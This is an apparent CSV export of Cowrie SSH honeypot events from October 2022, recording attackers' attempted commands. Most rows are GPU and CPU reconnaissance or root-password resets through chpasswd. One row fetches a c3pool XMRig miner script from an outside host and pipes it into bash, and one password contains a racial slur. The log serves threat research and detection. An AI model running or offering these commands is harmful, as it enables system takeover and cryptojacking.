eventid,username,input,size,compCS,width,outfile,protocol,duration,height,url,keyAlgs,ttylog,data,sensor,arch,session,shasum,message,langCS,timestamp,kexAlgs,encCS,password,version,dst_port,macCS,destfile,client_fingerprint,filename
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,9e13fef3e6c8,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:43:39.411897Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,9e13fef3e6c8,,Command not found: nvidia-smi,,2022-10-01T05:43:39.414297Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,9e13fef3e6c8,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:43:39.416868Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,3af65bc6f951,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:43:56.555833Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,3af65bc6f951,,Command not found: nvidia-smi,,2022-10-01T05:43:56.559189Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,4940df31e389,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:44:06.804216Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,4940df31e389,,Command not found: nvidia-smi,,2022-10-01T05:44:06.806980Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,275e9df6f789,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:44:25.477765Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,275e9df6f789,,Command not found: nvidia-smi,,2022-10-01T05:44:25.480429Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,71245b788506,,Command not found: nvidia-smi,,2022-10-01T05:44:34.211599Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,71245b788506,,Command not found: echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,2022-10-01T05:44:34.214064Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,7752b100fafe,,Command not found: nvidia-smi,,2022-10-01T05:44:38.096202Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,7752b100fafe,,Command not found: echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,2022-10-01T05:44:38.099990Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,55b77022697e,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:44:40.577370Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,55b77022697e,,Command not found: nvidia-smi,,2022-10-01T05:44:40.580096Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,101f16ba035f,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:44:42.555783Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,101f16ba035f,,Command not found: nvidia-smi,,2022-10-01T05:44:42.572043Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,442836f1f16c,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:44:53.632929Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,442836f1f16c,,Command not found: nvidia-smi,,2022-10-01T05:44:53.635775Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,cc31d7e4ffea,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:44:56.947779Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,cc31d7e4ffea,,Command not found: nvidia-smi,,2022-10-01T05:44:56.951012Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,4c8bc9c48268,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:45:01.742757Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,4c8bc9c48268,,Command not found: nvidia-smi,,2022-10-01T05:45:01.745411Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,7bc13aca6530,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:45:25.266036Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,7bc13aca6530,,Command not found: nvidia-smi,,2022-10-01T05:45:25.268652Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,0c0d78b82fb0,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:45:33.508955Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,0c0d78b82fb0,,Command not found: nvidia-smi,,2022-10-01T05:45:33.511516Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,cb49bb0538a0,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:45:41.167513Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,cb49bb0538a0,,Command not found: nvidia-smi,,2022-10-01T05:45:41.171599Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,24c9c94486da,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:45:51.359743Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,24c9c94486da,,Command not found: nvidia-smi,,2022-10-01T05:45:51.362514Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c9943f62308e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:05.806747Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,72db6df0c248,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:06.366736Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,df7027530795,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:07.506635Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,14ad55bb4e6b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:08.132461Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,5022bc147328,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:08.972603Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2f4af6a36d59,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:10.696390Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e114c9eb0b68,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:11.521765Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f3fcbb564b4e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:12.062986Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1a38f7966a9a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:12.878458Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d56dad0ebe90,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:13.411948Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,9e7f96b3d5ba,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:46:14.294737Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,9e7f96b3d5ba,,Command not found: nvidia-smi,,2022-10-01T05:46:14.297735Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d4d5edd80b9f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:14.983878Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,fc9df61219a0,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:15.759851Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2e1f83d7b27b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:16.712926Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f9946e1da68f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:17.595498Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,334aaba4378f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:18.409487Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,06e1b871441e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:20.491824Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9253eb9df445,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:21.643545Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d9ae439d50a1,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:22.187090Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,473fce0612e1,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:22.926644Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1c0bed0d4d60,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:23.742297Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6fd80617d08b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:24.273014Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,890f824a818a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:24.798935Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a3a11faf997a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:25.631022Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1c537fa10c16,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:26.161719Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,654341160ee3,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:27.360407Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a4fdb0c3581b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:28.225501Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,437286c1f1ac,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:28.754835Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,507eec802b3e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:29.886853Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b0bcfb46b5ef,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:30.883635Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4473cd4146d5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:31.423485Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,7e77405d8407,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:32.281582Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,10f5131da558,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:33.133022Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0551c03d5fc4,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:33.660742Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9cdcd759c206,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:34.929114Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,95cb318480bd,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:35.999876Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c393122ff57f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:36.788589Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c664b9e0f954,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:37.574781Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c5e9d5cd9d03,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:38.105087Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ea1598731f94,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:38.925287Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,827be9b89816,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:39.462444Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8d76c658da5b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:40.269541Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6436286507b2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:41.173903Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,048e27d1145e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:41.709476Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,782a92835780,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:42.853483Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b5b98c3f6612,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:43.400452Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8bac026e691f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:44.261331Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,af559390de94,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:45.089764Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,406e260e8fec,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:45.939005Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d030a7c342f3,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:46.695731Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,7e345832bbfc,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:47.243190Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8c3a105eeb1e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:48.107938Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ab8634566710,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:48.634630Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,66e04b600f9d,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:49.175885Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,43fe794beafd,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:51.885750Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9bf3d8b1a889,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:52.416480Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,05f7cb51cc8a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:53.460508Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9e6ddf594d1b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:46:54.000542Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,d64d0bd865ad,,Command not found: nvidia-smi,,2022-10-01T05:46:58.931103Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,d64d0bd865ad,,Command not found: echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,2022-10-01T05:46:58.933457Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,ee0714addaae,,Command not found: nvidia-smi,,2022-10-01T05:47:09.777676Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,ee0714addaae,,Command not found: echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,2022-10-01T05:47:09.780187Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f3bd4481e1f1,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:16.208826Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f471cf443632,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:17.296818Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8e3ea4a3c323,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:18.109650Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,edb8d2a4684e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:18.702812Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ba4e00c548f2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:19.935837Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c3264b95bae5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:20.893124Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c8686bb5c881,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:21.561028Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,016cc7cbc743,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:22.273351Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,dda3bbcea521,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:22.806802Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,3ddc71e0b8ef,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:23.559881Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,6a465e5de1f9,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:47:24.358963Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,022e3a3c06a9,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:25.495869Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,596bd6b38aed,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:28.037736Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1c3d412c75a5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:28.611423Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,87b613b334b9,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:29.359915Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,522f928f8afb,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:29.840982Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f5cc08c8372c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:31.031494Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d654d1aec455,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:31.577109Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c1cad2750d74,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:47:32.369393Z,,,,,,,,,
